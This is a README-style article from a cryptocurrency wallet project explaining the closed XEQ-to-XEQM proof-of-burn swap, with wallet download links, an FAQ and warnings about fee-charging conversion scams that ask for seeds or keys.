![XEQM WALLET](assets/banner-article.png)

# Migrate from XEQ to XEQM

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

The XEQ to XEQM migration was a proof-of-burn swap: legacy XEQ was burned to an unspendable address and the equivalent amount of XEQM was minted to the address you supplied. The swap ran for a fixed window and is closed, so this page describes how it worked, what carried across, and what to do if you are holding legacy coins today.

## What the swap actually did

Two chains, one balance. The legacy chain had XEQ; the current network has XEQM. The swap moved value between them without moving history: it burned the old coins and issued the new ones in the same amount.

That is why the migration was not a bridge and not a trade. There was no rate, no counterparty and no market  -  one unit of XEQ became one unit of XEQM, and the project charged nothing for the operation.

## Why a burn

A burn is a public, verifiable way to prove that the old coins will never move again. Sending them to an unspendable address makes the destruction visible on the legacy chain, which is what let the new chain issue the equivalent amount without guessing.

The alternative  -  freezing old coins on a server  -  would have required somebody to hold a key and be trusted with it. The burn removes that party entirely, which is the same reasoning behind self-custody in the wallet itself.

## What you needed to take part

Three things: legacy XEQ to burn, a little more legacy XEQ to pay the burn transaction's fee, and an XEQM address to receive the new coins. The project charged no swap fee, but the legacy network still charged its own transaction fee.

You also needed control of the legacy coins. Migration from a custodial exchange address was impossible, because the exchange held the key and the swap needed a signature from it. [Recover XEQM without the seed phrase](https://github.com/XEQMFoundation/custody-and-protection/blob/main/can-i-recover-xeqm-without-seed.md) covers the general shape of "somebody else holds the key".

## What carried across, and what did not

The balance carried. The transaction history did not  -  the new coins arrived on a chain that had never seen the old wallet's payments, so the address you supplied looked new and its past began at the migration.

That distinction matters for records rather than for money. Old payments stay visible on the legacy chain, the new balance is complete, and no proof generated on the new chain can describe a legacy transaction.

## The window, and why it is closed

The swap ran as a fixed production window with a public, auditable record of the burns and the mints. It has finished, and there is no route to submit a new migration claim.

That is worth saying plainly because pages describing the swap as open still exist, and a reader who finds one may believe there is time. There is not. [Is the XEQ swap still open](https://github.com/XEQMFoundation/custody-and-protection/blob/main/is-the-xeq-swap-to-xeqm-open.md) is the direct answer to that question.

## If you still hold legacy XEQ

The coins are on the legacy chain and the swap that would have converted them has closed. There is no official route to convert them now, and no service that can do it for you.

Treat any offer to convert legacy XEQ for a fee as a scam, particularly one that asks for the legacy wallet's key or seed. The migration needed a signature from the holder; a stranger asking for that signature is asking for the coins.

## Why the swap was self-service

The swap did not require an account, a form signed by a person or a support ticket. It required a burn and a claim that named where the new coins should go, which meant the holder did the work and the portal recorded it.

Self-service was a deliberate choice rather than a shortcut. Any design that let somebody else submit on your behalf would have needed a custodian, and a custodian is a party who can lose your coins or refuse your claim. The trade was more work for the holder and no trusted middle.

It also means there is no customer record to appeal to now. What exists is the chain and the published record of the window.

## What the tracker showed, and still shows

The swap portal published the status of each claim, and the two states people encountered were informative rather than mysterious. A claim marked expired meant the backend was still polling and would resubmit; a claim rejected for an invalid proof meant the proof had to be regenerated and resubmitted with the same transaction identifier and address.

Those statuses belong to a window that has closed, and they are documented here because people still read old threads and wonder what the words meant. [XEQM swap status expired](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-status-expired.md) and [XEQM swap rejected invalid proof](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-rejected-invalid-proof.md) cover both.

## The legacy wallet is a different product

An older XEQ GUI exists for the legacy chain, and it is not the wallet described on this site. It talks to a chain that no longer carries the current coin, and its releases are separate.

Do not install it expecting XEQM. If you are holding legacy coins and want to know what they are, the answer starts with which chain the wallet is connected to. [XEQM GUI vs the legacy XEQ GUI](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-gui-vs-legacy-wallet.md) covers the difference.

## What the current wallet does with all this

Nothing in XEQM WALLET refers to the migration. It creates wallets on the current chain, restores from a 25-word seed, and shows XEQM. There is no migration screen and no place to submit a burn.

That is the honest state of it: the migration is history, and the wallet is built for what came after. [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md) covers what it does now.

## Why the old coins are worth understanding rather than chasing

Legacy XEQ is now a historical asset. Understanding it is useful  -  it explains an old wallet, an old balance and a burn transaction in your records  -  but chasing a conversion is not, because there is nowhere to convert it.

The same reasoning applies to services built around legacy holdings. A market for an asset nobody can migrate is a market for a claim that cannot be exercised, and the people selling into it know that.

## The order the swap happened in

Burn first, claim second, mint third. The burn is the irreversible step, and everything after it is bookkeeping against a transaction that already exists.

That order is why the advice always pointed at the burn's identifier. It is the anchor for every later question, and it is the one part of the process that cannot be recreated.

## What to tell someone who asks

If somebody says they can still migrate XEQ, ask which portal they used and what its status says. A closed window has no submissions, and a claim that it does is either confusion about the legacy chain or an attempt to get a key.

If they are simply holding old coins and wondering, the answer is that the swap is over and the coins are legacy assets. That is a disappointing answer and a true one.

## Frequently asked questions

### Can I still migrate XEQ to XEQM?

No. The swap ran for a fixed window and has closed; there is no route to submit a new claim.

### Did the migration cost anything?

The project charged no swap fee. You needed a little legacy XEQ for the burn transaction's own network fee.

### Did my transaction history move across?

No. The balance carried at one to one; the history stayed on the legacy chain.

### Could I migrate from an exchange?

No. The swap needed a signature from the holder, and a custodial exchange holds the key.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [Is the XEQ swap still open](https://github.com/XEQMFoundation/custody-and-protection/blob/main/is-the-xeq-swap-to-xeqm-open.md)
- [XEQ history does not migrate](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-history-not-migrated.md)
- [XEQM swap status expired](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-status-expired.md)
